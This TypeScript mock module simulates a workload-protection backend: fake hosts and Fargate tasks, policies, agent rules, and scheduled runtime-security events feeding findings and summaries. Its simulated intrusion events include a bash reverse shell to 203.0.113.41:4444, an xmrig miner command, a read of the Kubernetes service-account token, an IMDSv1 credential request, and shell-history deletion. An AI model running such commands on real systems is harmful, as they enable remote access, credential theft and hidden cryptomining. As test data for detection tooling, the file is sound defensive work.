// In-browser Workload Protection for mock mode: the Agents of oc-tracegen's cws.rs (six hosts, three
// Fargate tasks, plus a few hosts without the runtime security module), agent events on its schedule
// (routine sudo, root processes and IMDSv1 requests, drift in the storefront containers, an
// intrusion every 45 minutes, a cryptominer every hour), and what the server derives from them:
// findings, the summary, policies and agent rules (the server's catalog, workloadCatalog.ts).
// Signals come from the security mock (workload_security rules).
import type {
  CsmAgent,
  TimeRange,
  WpAgentRule,
  WpAgentRuleInput,
  WpAgents,
  WpEvent,
  WpEventsPage,
  WpFacet,
  WpFinding,
  WpFindingRule,
  WpFindings,
  WpPolicy,
  WpPolicyInput,
  WpSeries,
  WpSummary,
} from '../workloadProtection/types';
import { parseQuery } from '../../lib/searchQuery';
import { matchesTerms } from './match';
import { rng } from './generator';
import { signalsBetween } from './security';
import { WP_AGENT_RULES, WP_FINDING_RULES, WP_PACKS, WP_POLICIES, WP_TACTICS, wpCategory, wpPolicyId, wpStableId, type WpCatalogRule } from './workloadCatalog';

const MIN = 60_000;
const HOUR = 60 * MIN;
const DAY = 24 * HOUR;
const delay = <T>(v: T, ms = 140): Promise<T> => new Promise((r) => setTimeout(() => r(structuredClone(v)), ms));
const fail = (m: string): never => {
  throw new Error(m);
};
const SOURCE = 'runtime-security-agent';
const AGENT_VERSION = '7.70.2';

// ---------------------------------------------------------------- Agents

interface HostDef {
  name: string;
  env: string;
  cluster: string;
  cws: boolean;
  cspm: boolean;
  os: 'linux' | 'windows';
  version: string;
  tool: string;
}
const HOSTS: HostDef[] = [
  { name: 'i-0a1b2c3d4e5f60001', env: 'prod', cluster: 'shop-prod-eks', cws: true, cspm: true, os: 'linux', version: AGENT_VERSION, tool: 'helm' },
  { name: 'i-0a1b2c3d4e5f60002', env: 'prod', cluster: 'shop-prod-eks', cws: true, cspm: true, os: 'linux', version: AGENT_VERSION, tool: 'helm' },
  { name: 'i-0a1b2c3d4e5f60003', env: 'prod', cluster: 'shop-prod-eks', cws: true, cspm: true, os: 'linux', version: AGENT_VERSION, tool: 'helm' },
  { name: 'i-0a1b2c3d4e5f60004', env: 'prod', cluster: '', cws: true, cspm: false, os: 'linux', version: AGENT_VERSION, tool: 'install_script' },
  { name: 'i-0a1b2c3d4e5f60005', env: 'prod', cluster: '', cws: true, cspm: false, os: 'linux', version: AGENT_VERSION, tool: 'install_script' },
  { name: 'i-0a1b2c3d4e5f60006', env: 'staging', cluster: 'shop-staging-eks', cws: false, cspm: true, os: 'linux', version: AGENT_VERSION, tool: 'helm' },
  { name: 'i-0a1b2c3d4e5f60007', env: 'staging', cluster: 'shop-staging-eks', cws: false, cspm: false, os: 'linux', version: '7.66.1', tool: 'helm' },
  { name: 'i-0a1b2c3d4e5f60008', env: 'dev', cluster: '', cws: false, cspm: false, os: 'linux', version: '7.62.3', tool: 'install_script' },
  { name: 'i-0a1b2c3d4e5f60009', env: 'prod', cluster: '', cws: false, cspm: false, os: 'windows', version: '7.70.0', tool: 'windows_msi' },
];
const TASKS: [string, string, string, boolean][] = [
  ['4f6c1e0a9b2d4c7e8a1f3b5d7c9e0a12', 'shop-prod-ecs', 'billing', true],
  ['7a2b9c4d1e6f4a3b8c5d2e7f9a0b1c34', 'shop-prod-ecs', 'billing', false],
  ['9d8c7b6a5f4e4d3c2b1a0f9e8d7c6b56', 'shop-prod-ecs', 'notification-service', false],
];

function hostAgent(h: HostDef, i: number): CsmAgent {
  const tags = [`env:${h.env}`, ...(h.cluster ? [`kube_cluster_name:${h.cluster}`] : [])];
  return {
    id: wpStableId(`agent:${h.name}`).replace(/-/g, '') + '00000000000000000000000',
    hostId: 29_630_000_000 + i,
    hostname: h.name,
    agentVersion: h.version,
    os: h.os === 'windows' ? 'Windows Server 2022' : 'GNU/Linux',
    envs: [h.env],
    clusterName: h.cluster ? [h.cluster] : [],
    awsFargate: '',
    ecsFargateTaskArn: '',
    installMethodTool: h.tool,
    installMethodInstallerVersion: h.tool === 'helm' ? 'datadog-3.120.0' : '',
    isCwsEnabled: h.cws,
    isCspmEnabled: h.cspm,
    isCsmVmHostsEnabled: i % 2 === 0,
    isCsmVmContainersEnabled: !!h.cluster,
    isRemoteConfigurationEnabled: true,
    isCwsRemoteConfigurationEnabled: false,
    tags,
    osLogo: h.os,
    platformLogo: h.cluster ? 'kubernetes' : '',
    lastSeen: Date.now() - (i % 4) * 4 * MIN,
  };
}

function taskAgent([task, cluster, service, on]: [string, string, string, boolean], i: number): CsmAgent {
  return {
    id: task,
    hostId: 29_640_000_000 + i,
    hostname: `fargate-${task.slice(0, 12)}`,
    agentVersion: AGENT_VERSION,
    os: 'GNU/Linux',
    envs: ['prod'],
    clusterName: [cluster],
    awsFargate: 'ECS',
    ecsFargateTaskArn: `arn:aws:ecs:eu-central-1:123456789012:task/${cluster}/${task}`,
    installMethodTool: 'ecs_task_definition',
    installMethodInstallerVersion: '',
    isCwsEnabled: on,
    isCspmEnabled: false,
    isCsmVmHostsEnabled: false,
    isCsmVmContainersEnabled: false,
    isRemoteConfigurationEnabled: true,
    isCwsRemoteConfigurationEnabled: false,
    tags: ['env:prod', `ecs_cluster_name:${cluster}`, `service:${service}`],
    osLogo: 'linux',
    platformLogo: 'amazonecs',
    lastSeen: Date.now() - i * 2 * MIN,
  };
}

const allAgents = (): CsmAgent[] => [...HOSTS.map(hostAgent), ...TASKS.map(taskAgent)];

export async function agents(): Promise<WpAgents> {
  const all = allAgents();
  return delay({ hosts: all.filter((a) => !a.awsFargate), serverless: all.filter((a) => a.awsFargate) });
}

// ---------------------------------------------------------------- policies and agent rules

interface PolicyState {
  id: string;
  name: string;
  description: string;
  enabled: boolean;
  hostTagsLists: string[][];
  isDefault: boolean;
  version: number;
  updatedAt: number;
  updatedBy: string;
}
interface RuleState {
  id: string;
  name: string;
  description: string;
  expression: string;
  policyId: string;
  enabled: boolean;
  silent: boolean;
  productTags: string[];
  isDefault: boolean;
  createdAt: number;
  updatedAt: number;
  updatedBy: string;
}

const t0 = Date.now() - 60 * DAY;
let policyState: PolicyState[] = [
  ...WP_POLICIES.map(([key, name, description]) => ({
    id: wpPolicyId(key),
    name,
    description,
    enabled: true,
    hostTagsLists: [],
    isDefault: true,
    version: 1,
    updatedAt: t0,
    updatedBy: 'ObserveCraft',
  })),
  {
    id: wpStableId('policy:storefront-hardening'),
    name: 'Storefront hardening',
    description: 'Extra rules for the storefront containers.',
    enabled: true,
    hostTagsLists: [['env:prod', 'kube_cluster_name:shop-prod-eks']],
    isDefault: false,
    version: 3,
    updatedAt: Date.now() - 9 * DAY,
    updatedBy: 'Priya Shah',
  },
];
let ruleState: RuleState[] = [
  ...WP_AGENT_RULES.map((r) => ({
    id: wpStableId(`rule:${r.name}`),
    name: r.name,
    description: r.description,
    expression: r.expression,
    policyId: wpPolicyId(r.policy),
    enabled: true,
    silent: false,
    productTags: [...(r.tactic ? [`tactic:${r.tactic}`, `technique:${r.technique}`] : []), ...(r.pack ? [`content_pack:${r.pack}`] : [])],
    isDefault: true,
    createdAt: t0,
    updatedAt: t0,
    updatedBy: 'ObserveCraft',
  })),
  {
    id: wpStableId('rule:storefront_writes_outside_app'),
    name: 'storefront_writes_outside_app',
    description: 'The storefront process wrote outside /app and /tmp.',
    expression: 'open.flags & O_WRONLY > 0 && process.file.name == "node" && open.file.path !~ "/app/**" && open.file.path !~ "/tmp/**" && container.id != ""',
    policyId: wpStableId('policy:storefront-hardening'),
    enabled: true,
    silent: false,
    productTags: ['team:storefront'],
    isDefault: false,
    createdAt: Date.now() - 20 * DAY,
    updatedAt: Date.now() - 9 * DAY,
    updatedBy: 'Priya Shah',
  },
];

const matchesTags = (lists: string[][], tags: string[]) => lists.length === 0 || lists.some((l) => l.every((t) => tags.includes(t)));

function policyView(p: PolicyState): WpPolicy {
  const rules = ruleState.filter((r) => r.policyId === p.id);
  return {
    id: p.id,
    name: p.name,
    description: p.description,
    enabled: p.enabled,
    hostTagsLists: p.hostTagsLists,
    isDefault: p.isDefault,
    version: p.version,
    monitoring: rules.filter((r) => r.enabled).length,
    blocking: 0,
    disabled: rules.filter((r) => !r.enabled).length,
    agents: allAgents().filter((a) => a.isCwsEnabled && matchesTags(p.hostTagsLists, a.tags)).length,
    updatedAt: p.updatedAt,
    updatedBy: p.updatedBy,
  };
}

export async function policies(): Promise<WpPolicy[]> {
  return delay(policyState.map(policyView));
}

export async function createPolicy(input: WpPolicyInput): Promise<WpPolicy> {
  const name = (input.name ?? '').trim();
  if (!name) fail('a name is required');
  if (policyState.some((p) => p.name === name)) fail(`a policy named "${name}" already exists`);
  const p: PolicyState = {
    id: wpStableId(`policy:${name}:${Date.now()}`),
    name,
    description: input.description ?? '',
    enabled: input.enabled ?? false,
    hostTagsLists: input.hostTagsLists ?? [],
    isDefault: false,
    version: 1,
    updatedAt: Date.now(),
    updatedBy: 'Alex Morgan',
  };
  policyState = [...policyState, p];
  return delay(policyView(p));
}

export async function updatePolicy(id: string, input: WpPolicyInput): Promise<WpPolicy> {
  const p = policyState.find((x) => x.id === id) ?? fail('Not Found');
  if (p.isDefault && ((input.name !== undefined && input.name !== p.name) || input.hostTagsLists !== undefined)) fail('default policies can only be enabled or disabled');
  Object.assign(p, {
    name: input.name?.trim() || p.name,
    description: input.description ?? p.description,
    enabled: input.enabled ?? p.enabled,
    hostTagsLists: input.hostTagsLists ?? p.hostTagsLists,
    version: p.version + 1,
    updatedAt: Date.now(),
    updatedBy: 'Alex Morgan',
  });
  return delay(policyView(p));
}

export async function deletePolicy(id: string): Promise<void> {
  const p = policyState.find((x) => x.id === id) ?? fail('Not Found');
  if (p.isDefault) fail("default policies can't be deleted");
  policyState = policyState.filter((x) => x.id !== id);
  ruleState = ruleState.filter((r) => r.policyId !== id);
  return delay(undefined);
}

function ruleView(r: RuleState, matches: Map<string, number>): WpAgentRule {
  const def: WpCatalogRule | undefined = r.isDefault ? WP_AGENT_RULES.find((d) => d.name === r.name) : undefined;
  const tag = (prefix: string) => r.productTags.find((t) => t.startsWith(prefix))?.slice(prefix.length) ?? '';
  return {
    id: r.id,
    name: r.name,
    title: def?.title ?? (r.description.split('.')[0].trim() || r.name),
    description: r.description,
    expression: r.expression,
    category: wpCategory(r.expression),
    enabled: r.enabled,
    blocking: false,
    silent: r.silent,
    productTags: r.productTags,
    policyId: r.policyId,
    policyName: policyState.find((p) => p.id === r.policyId)?.name ?? '',
    isDefault: r.isDefault,
    tactic: def?.tactic ?? tag('tactic:').split('-')[0],
    technique: def?.technique ?? tag('technique:'),
    pack: def?.pack ?? '',
    severity: def?.severity ?? '',
    actions: [],
    matches: matches.get(r.name) ?? 0,
    createdAt: r.createdAt,
    updatedAt: r.updatedAt,
    updatedBy: r.updatedBy,
  };
}

export async function agentRules(range: TimeRange, policyId?: string): Promise<WpAgentRule[]> {
  const matches = new Map<string, number>();
  for (const e of eventsBetween(range.from, range.to)) matches.set(e.ruleId, (matches.get(e.ruleId) ?? 0) + 1);
  return delay(ruleState.filter((r) => !policyId || r.policyId === policyId).map((r) => ruleView(r, matches)));
}

const booleanExpression = (e: string) => /==|!=|=~|!~| in | allin |>|<|&&|\|\|/.test(e);

export async function createAgentRule(input: WpAgentRuleInput): Promise<WpAgentRule> {
  const name = (input.name ?? '').trim();
  if (!/^[a-z0-9_]+$/.test(name)) fail('lowercase letters, digits and underscores only');
  const expression = input.expression ?? '';
  if (!booleanExpression(expression)) fail(`rule \`${name}\`: a boolean expression is expected`);
  const policyId = input.policyId ?? '';
  if (policyId && !policyState.some((p) => p.id === policyId)) fail('policy not found');
  if (ruleState.some((r) => r.policyId === policyId && r.name === name)) fail(`an agent rule named "${name}" already exists in this policy`);
  const r: RuleState = {
    id: wpStableId(`rule:${name}:${Date.now()}`),
    name,
    description: input.description ?? '',
    expression,
    policyId,
    enabled: input.enabled ?? true,
    silent: input.silent ?? false,
    productTags: input.productTags ?? [],
    isDefault: false,
    createdAt: Date.now(),
    updatedAt: Date.now(),
    updatedBy: 'Alex Morgan',
  };
  ruleState = [...ruleState, r];
  return delay(ruleView(r, new Map()));
}

export async function updateAgentRule(id: string, input: WpAgentRuleInput): Promise<WpAgentRule> {
  const r = ruleState.find((x) => x.id === id) ?? fail('agent rule not found');
  const expression = input.expression ?? r.expression;
  if (r.isDefault && expression !== r.expression) fail('default agent rules can only be enabled or disabled');
  if (!booleanExpression(expression)) fail(`rule \`${r.name}\`: a boolean expression is expected`);
  Object.assign(r, {
    description: input.description ?? r.description,
    expression,
    enabled: input.enabled ?? r.enabled,
    silent: input.silent ?? r.silent,
    productTags: input.productTags ?? r.productTags,
    updatedAt: Date.now(),
    updatedBy: 'Alex Morgan',
  });
  return delay(ruleView(r, new Map()));
}

export async function deleteAgentRule(id: string): Promise<void> {
  const r = ruleState.find((x) => x.id === id) ?? fail('agent rule not found');
  if (r.isDefault) fail("default agent rules can't be deleted, disable them instead");
  ruleState = ruleState.filter((x) => x.id !== id);
  return delay(undefined);
}

/** The enabled policies as Agent policy files, concatenated. */
export function policyFiles(): string {
  return policyState
    .filter((p) => p.enabled)
    .map((p) => {
      const rules = ruleState.filter((r) => r.policyId === p.id);
      const body = rules
        .map((r) => `  - id: ${r.name}\n    description: ${JSON.stringify(r.description)}\n    expression: ${JSON.stringify(r.expression)}${r.enabled ? '' : '\n    disabled: true'}`)
        .join('\n');
      return `# ${p.name} (${p.id}), from ObserveCraft.\nversion: "${p.version}"\nrules:\n${body}\n`;
    })
    .join('\n---\n');
}

// ---------------------------------------------------------------- agent events

const CONTAINERS: [string, string, string][] = [
  ['storefront-api-7d9f6c5b8-x2kq4', 'storefront-api', 'storefront-api'],
  ['order-service-5c8d7f9b6-m4pz7', 'order-service', 'order-service'],
  ['catalog-service-6b7c8d9e5-q8wl2', 'catalog-service', 'catalog-service'],
  ['checkout-6f5e4d3c2-v7rn9', 'checkout', 'checkout'],
  ['api-gateway-8a9b7c6d5-k3jt6', 'api-gateway', 'api-gateway'],
];
const containerId = (name: string) => wpStableId(`container:${name}`).replace(/-/g, '').padEnd(64, '0');

interface Spec {
  rule: string;
  every: number;
  offset: number;
  host: (slot: number) => number;
  container?: (slot: number) => number;
  process: [string, string[], string, string];
  extra?: Record<string, unknown>;
}
const P = (path: string, args: string[], user: string, parent: string): [string, string[], string, string] => [path, args, user, parent];
// Routine events are thinned to one every few minutes (tracegen sends them every few seconds).
const SPECS: Spec[] = [
  { rule: 'sudo_used', every: 4 * MIN, offset: 0, host: (s) => [1, 2, 3, 4, 5][s % 5], process: P('/usr/bin/sudo', ['systemctl', 'status', 'nginx'], 'ana.popescu', 'bash') },
  { rule: 'root_process_in_container', every: 3 * MIN, offset: MIN, host: (s) => 1 + (s % 3), container: (s) => s % 5, process: P('/usr/local/bin/node', ['server.js'], 'root', 'tini') },
  {
    rule: 'imds_v1_request',
    every: 5 * MIN,
    offset: 2 * MIN,
    host: () => 4,
    process: P('/usr/bin/python3', ['/opt/backup/sync.py'], 'backup', 'cron'),
    extra: { imds: { cloud_provider: 'aws', type: 'request', url: '/latest/meta-data/iam/security-credentials/', aws: { is_imds_v2: false } } },
  },
  { rule: 'shell_in_container', every: 2 * HOUR, offset: 31 * MIN, host: () => 1, container: () => 0, process: P('/bin/sh', ['-c', 'ls /app'], 'root', 'runc') },
  {
    rule: 'package_manager_in_container',
    every: 5 * MIN * 20,
    offset: 97 * MIN,
    host: (s) => 1 + (s % 3),
    container: (s) => (s + 1) % 5,
    process: P('/usr/bin/apt-get', ['install', '-y', 'curl'], 'root', 'sh'),
  },
  { rule: 'compiler_in_container', every: 15 * MIN * 4, offset: 7 * MIN, host: () => 2, container: () => 2, process: P('/usr/bin/gcc', ['-o', '/tmp/x', '/tmp/x.c'], 'root', 'sh') },
  {
    rule: 'sudoers_modified',
    every: 30 * MIN,
    offset: 10 * MIN,
    host: () => 5,
    process: P('/usr/bin/vim', ['/etc/sudoers.d/deploy'], 'root', 'sudo'),
    extra: { file: { path: '/etc/sudoers.d/deploy', name: 'deploy' } },
  },
  { rule: 'user_account_created', every: HOUR, offset: 20 * MIN, host: () => 4, process: P('/usr/sbin/useradd', ['-m', 'svc-reports'], 'root', 'bash') },
  { rule: 'package_installed_on_host', every: HOUR, offset: 20 * MIN + 4000, host: () => 4, process: P('/usr/bin/apt-get', ['install', '-y', 'htop'], 'root', 'bash') },
  { rule: 'web_server_spawned_shell', every: 45 * MIN, offset: 25 * MIN, host: () => 1, container: () => 0, process: P('/bin/sh', ['-c', 'id; uname -a'], 'node', 'node') },
  { rule: 'shell_in_container', every: 45 * MIN, offset: 25 * MIN + 7000, host: () => 1, container: () => 0, process: P('/bin/bash', ['-i'], 'node', 'node') },
  {
    rule: 'service_account_token_read',
    every: 45 * MIN,
    offset: 25 * MIN + 14000,
    host: () => 1,
    container: () => 0,
    process: P('/bin/cat', ['/var/run/secrets/kubernetes.io/serviceaccount/token'], 'node', 'bash'),
    extra: { file: { path: '/var/run/secrets/kubernetes.io/serviceaccount/token', name: 'token' } },
  },
  { rule: 'network_scanner_executed', every: 45 * MIN, offset: 25 * MIN + 21000, host: () => 1, container: () => 0, process: P('/tmp/nmap', ['-sT', '10.0.0.0/24'], 'node', 'bash') },
  { rule: 'downloaded_binary_executed', every: 45 * MIN, offset: 25 * MIN + 28000, host: () => 1, container: () => 0, process: P('/tmp/nmap', ['-sT', '10.0.0.0/24'], 'node', 'bash') },
  {
    rule: 'reverse_shell',
    every: 45 * MIN,
    offset: 25 * MIN + 35000,
    host: () => 1,
    container: () => 0,
    process: P('/bin/bash', ['-c', 'bash -i >& /dev/tcp/203.0.113.41/4444 0>&1'], 'node', 'bash'),
  },
  { rule: 'cryptominer_executed', every: HOUR, offset: 40 * MIN, host: () => 5, process: P('/dev/shm/.x/xmrig', ['-o', 'stratum+tcp://pool.example.net:3333'], 'www-data', 'sh') },
  {
    rule: 'mining_pool_dns',
    every: HOUR,
    offset: 40 * MIN + 2000,
    host: () => 5,
    process: P('/dev/shm/.x/xmrig', [], 'www-data', 'sh'),
    extra: { dns: { question: { name: 'xmr-pool.example.net', type: 'A' } } },
  },
  {
    rule: 'shell_history_cleared',
    every: HOUR,
    offset: 40 * MIN + 30000,
    host: () => 5,
    process: P('/bin/rm', ['-f', '/var/www/.bash_history'], 'www-data', 'sh'),
    extra: { file: { path: '/var/www/.bash_history', name: '.bash_history' } },
  },
];

const EVENT_NAME: Record<string, string> = { 'Process Activity': 'exec', 'File Activity': 'open', 'Network Activity': 'dns', 'Kernel Activity': 'load_module' };

function makeEvent(spec: Spec, slot: number): WpEvent {
  const def = WP_AGENT_RULES.find((r) => r.name === spec.rule)!;
  const ts = slot * spec.every + spec.offset;
  const h = HOSTS[spec.host(slot) - 1];
  const c = spec.container ? CONTAINERS[spec.container(slot)] : undefined;
  const category = wpCategory(def.expression);
  const event = spec.rule === 'imds_v1_request' ? 'imds' : EVENT_NAME[category];
  const [path, args, user, parent] = spec.process;
  const attributes = {
    agent: { rule_id: spec.rule, policy_name: def.policy, version: AGENT_VERSION, os: 'linux', origin: 'ebpf' },
    title: def.title,
    evt: { name: event, category, outcome: 'Success' },
    process: { comm: path.split('/').pop(), executable: { path }, args, user, parent: { comm: parent } },
    ...(c ? { container: { id: containerId(c[0]) } } : {}),
    ...spec.extra,
  };
  const file = (spec.extra?.file as { path?: string } | undefined)?.path ?? (spec.extra?.dns as { question?: { name?: string } } | undefined)?.question?.name ?? '';
  return {
    id: `${spec.rule}-${slot}-${spec.offset}`,
    timestamp: ts,
    host: h.name,
    service: c ? c[2] : SOURCE,
    title: def.title,
    ruleId: spec.rule,
    category,
    event,
    outcome: 'Success',
    process: path,
    processArgs: args.join(' '),
    user,
    file,
    containerId: c ? containerId(c[0]) : '',
    containerName: c ? c[0] : '',
    image: c ? c[1] : '',
    env: h.env,
    attributes: attributes as WpEvent['attributes'],
  };
}

/** Matched events in [from, to], newest first (at most the last 7 days). */
function eventsBetween(from: number, to: number): WpEvent[] {
  const now = Date.now();
  const start = Math.max(from, now - 7 * DAY);
  const end = Math.min(to, now);
  const out: WpEvent[] = [];
  for (const spec of SPECS) {
    for (let slot = Math.ceil((start - spec.offset) / spec.every); slot * spec.every + spec.offset <= end; slot++) out.push(makeEvent(spec, slot));
  }
  return out.sort((a, b) => b.timestamp - a.timestamp);
}

function field(e: WpEvent, key: string): string | undefined {
  switch (key.replace(/^@/, '')) {
    case 'agent.rule_id':
      return e.ruleId;
    case 'evt.category':
      return e.category;
    case 'evt.name':
      return e.event;
    case 'host':
      return e.host;
    case 'service':
      return e.service;
    case 'env':
      return e.env;
    case 'image_name':
      return e.image;
    case 'container_name':
      return e.containerName;
    case 'container.id':
      return e.containerId;
    case 'process.file.name':
      return e.process.split('/').pop();
    case 'process.user':
    case 'usr.name':
      return e.user;
    case 'file.path':
      return e.file;
    case 'source':
      return SOURCE;
    default:
      return undefined;
  }
}

const CATEGORY_KEY: Record<string, string> = { 'File Activity': 'file', 'Process Activity': 'process', 'Network Activity': 'network', 'Kernel Activity': 'kernel' };
const bucketMs = (r: TimeRange) => Math.max(MIN, Math.floor((r.to - r.from) / 60 / MIN) * MIN);

function series(range: TimeRange, items: { t: number; k: string; n?: number }[], step = bucketMs(range)): WpSeries {
  const start = Math.floor(range.from / step) * step;
  const times: number[] = [];
  for (let t = start; t <= range.to; t += step) times.push(t);
  const groups = new Map<string, number[]>();
  for (const it of items) {
    const i = Math.floor((it.t - start) / step);
    if (i < 0 || i >= times.length) continue;
    const g = groups.get(it.k) ?? groups.set(it.k, Array(times.length).fill(0)).get(it.k)!;
    g[i] += it.n ?? 1;
  }
  return { times, groups: [...groups.entries()].sort().map(([name, values]) => ({ name, values })) };
}

const FACETS: [string, string][] = [
  ['@agent.rule_id', 'Agent rule'],
  ['@evt.category', 'Category'],
  ['@evt.name', 'Event type'],
  ['host', 'Host'],
  ['@process.file.name', 'Process'],
  ['image_name', 'Container image'],
  ['env', 'Environment'],
  ['service', 'Service'],
];

export async function events(range: TimeRange, query: string, limit = 100): Promise<WpEventsPage> {
  const terms = parseQuery(query);
  const matched = eventsBetween(range.from, range.to).filter((e) => matchesTerms((k) => field(e, k), `${e.title} ${e.process} ${e.processArgs} ${e.file}`, terms));
  const facets: WpFacet[] = FACETS.map(([key, label]) => {
    const counts = new Map<string, number>();
    for (const e of matched) {
      const v = field(e, key);
      if (v) counts.set(v, (counts.get(v) ?? 0) + 1);
    }
    return {
      key,
      label,
      values: [...counts.entries()]
        .sort((a, b) => b[1] - a[1])
        .slice(0, 10)
        .map(([name, count]) => ({ name, count })),
    };
  });
  return delay({
    events: matched.slice(0, limit),
    total: matched.length,
    series: series(
      range,
      matched.map((e) => ({ t: e.timestamp, k: CATEGORY_KEY[e.category] ?? 'kernel' })),
    ),
    facets,
  });
}

// ---------------------------------------------------------------- findings

const triageMap = new Map<string, string>();

export async function triage(key: string, status: 'open' | 'muted'): Promise<void> {
  triageMap.set(key, status);
  return delay(undefined);
}

function evaluate(range: TimeRange): { rules: WpFindingRule[]; findings: WpFinding[] } {
  const evs = eventsBetween(range.from, range.to);
  const hosts = new Set([
    ...allAgents()
      .filter((a) => a.isCwsEnabled && !a.awsFargate)
      .map((a) => a.hostname),
    ...evs.map((e) => e.host),
  ]);
  const containers = new Set(CONTAINERS.map((c) => containerId(c[0])));
  const rules: WpFindingRule[] = [];
  const findings: WpFinding[] = [];
  for (const f of WP_FINDING_RULES) {
    const byResource = new Map<string, WpFinding>();
    for (const e of evs.filter((x) => f.agentRules.includes(x.ruleId))) {
      const container = f.resourceType === 'container';
      if (container && !e.containerId) continue;
      const id = container ? e.containerId : e.host;
      const key = `workload-finding:${f.id}:${id}`;
      const cur = byResource.get(id) ?? {
        key,
        ruleId: f.id,
        ruleName: f.name,
        severity: f.severity,
        resourceType: f.resourceType,
        resource: container ? e.containerName : e.host,
        host: e.host,
        containerId: container ? e.containerId : '',
        image: container ? e.image : '',
        service: e.service,
        env: e.env,
        status: triageMap.get(key) ?? 'open',
        events: 0,
        agentRules: [],
        firstSeen: e.timestamp,
        lastSeen: e.timestamp,
      };
      cur.events += 1;
      cur.firstSeen = Math.min(cur.firstSeen, e.timestamp);
      cur.lastSeen = Math.max(cur.lastSeen, e.timestamp);
      if (!cur.agentRules.includes(e.ruleId)) cur.agentRules.push(e.ruleId);
      byResource.set(id, cur);
    }
    const total = f.resourceType === 'container' ? containers.size : hosts.size;
    rules.push({
      id: f.id,
      name: f.name,
      description: f.description,
      severity: f.severity,
      resourceType: f.resourceType,
      agentRules: f.agentRules,
      failing: byResource.size,
      passing: Math.max(0, total - byResource.size),
      muted: [...byResource.values()].filter((x) => x.status === 'muted').length,
    });
    findings.push(...byResource.values());
  }
  const rank: Record<string, number> = { critical: 5, high: 4, medium: 3, low: 2, info: 1 };
  findings.sort((a, b) => (rank[b.severity] ?? 0) - (rank[a.severity] ?? 0) || b.lastSeen - a.lastSeen);
  return { rules, findings };
}

export async function findings(range: TimeRange): Promise<WpFindings> {
  return delay(evaluate(range));
}

// ---------------------------------------------------------------- summary

const PROBE_RATES: [string, string, number][] = [
  ['open', 'file', 900],
  ['unlink', 'file', 6],
  ['rename', 'file', 3],
  ['chmod', 'file', 1.5],
  ['exec', 'process', 14],
  ['fork', 'process', 22],
  ['exit', 'process', 20],
  ['dns', 'network', 40],
  ['bind', 'network', 0.6],
  ['load_module', 'kernel', 0.01],
];

export async function summary(range: TimeRange): Promise<WpSummary> {
  const all = allAgents();
  const hosts = all.filter((a) => !a.awsFargate);
  const tasks = all.filter((a) => a.awsFargate);
  const evs = eventsBetween(range.from, range.to);
  const step = bucketMs(range);
  // The probes' counts: per enabled host, per bucket, with some noise.
  const r = rng(Math.floor(range.from / step));
  const probeItems: { t: number; k: string; n: number }[] = [];
  const cwsHosts = hosts.filter((h) => h.isCwsEnabled).length;
  const start = Math.floor(range.from / step) * step;
  for (let t = start; t <= Math.min(range.to, Date.now()); t += step) {
    for (const [, cat, rate] of PROBE_RATES) probeItems.push({ t, k: cat, n: Math.round(rate * cwsHosts * (step / 1000) * (0.8 + 0.4 * r())) });
  }
  const monitored: Record<string, number> = { file: 0, process: 0, network: 0, kernel: 0 };
  for (const it of probeItems) monitored[it.k] += it.n;
  const captured: Record<string, number> = { file: 0, process: 0, network: 0, kernel: 0 };
  for (const e of evs) captured[CATEGORY_KEY[e.category] ?? 'kernel'] += 1;
  const signals = signalsBetween(range.from, range.to).filter((s) => s.ruleType === 'workload_security');
  const bySeverity: Record<string, number> = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
  const triageCounts = new Map<string, number>();
  for (const s of signals) {
    bySeverity[s.severity] = (bySeverity[s.severity] ?? 0) + 1;
    const k = s.state === 'archived' ? s.archiveReason : s.state;
    triageCounts.set(k, (triageCounts.get(k) ?? 0) + 1);
  }
  const triageOrder = ['remediated', 'true_positive_malicious', 'true_positive_benign', 'investigated_case_opened', 'testing_or_maintenance', 'false_positive', 'other', 'under_review', 'open'];
  const { findings: failing } = evaluate(range);
  const findingCounts: Record<string, number> = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
  for (const f of failing.filter((x) => x.status === 'open')) findingCounts[f.severity] += 1;
  const enabled = new Set(ruleState.filter((x) => x.enabled).map((x) => x.name));
  return delay({
    agents: { hosts: hosts.length, hostsEnabled: hosts.filter((a) => a.isCwsEnabled).length, serverless: tasks.length, serverlessEnabled: tasks.filter((a) => a.isCwsEnabled).length },
    monitored,
    monitoredSeries: series(range, probeItems, step),
    captured,
    capturedSeries: series(
      range,
      evs.map((e) => ({ t: e.timestamp, k: CATEGORY_KEY[e.category] ?? 'kernel' })),
      step,
    ),
    policies: policyState.filter((p) => p.enabled).length,
    agentRules: ruleState.filter((x) => x.enabled).length,
    detectionRules: WP_AGENT_RULES.filter((x) => x.policy === 'threat-detection').length,
    findingRules: WP_FINDING_RULES.length,
    signals: bySeverity,
    signalSeries: series(
      range,
      signals.map((s) => ({ t: s.createdAt, k: s.severity })),
      DAY,
    ),
    triage: triageOrder.map((name) => ({ name, count: triageCounts.get(name) ?? 0 })),
    findings: findingCounts,
    tactics: WP_TACTICS.map(([id, name]) => ({ id, name, rules: WP_AGENT_RULES.filter((x) => x.tactic === id && enabled.has(x.name)).length })),
    packs: WP_PACKS.map(([id, name, description]) => {
      const inPack = WP_AGENT_RULES.filter((x) => x.pack === id);
      const on = inPack.filter((x) => enabled.has(x.name)).length;
      return { id, name, description, rules: inPack.length, enabledRules: on, status: on > 0 ? 'active' : 'available' };
    }),
    agentPolicies: WP_POLICIES.map(([key, name, description]) => ({ id: wpPolicyId(key), name, description, rules: ruleState.filter((x) => x.policyId === wpPolicyId(key) && x.enabled).length })),
  });
}
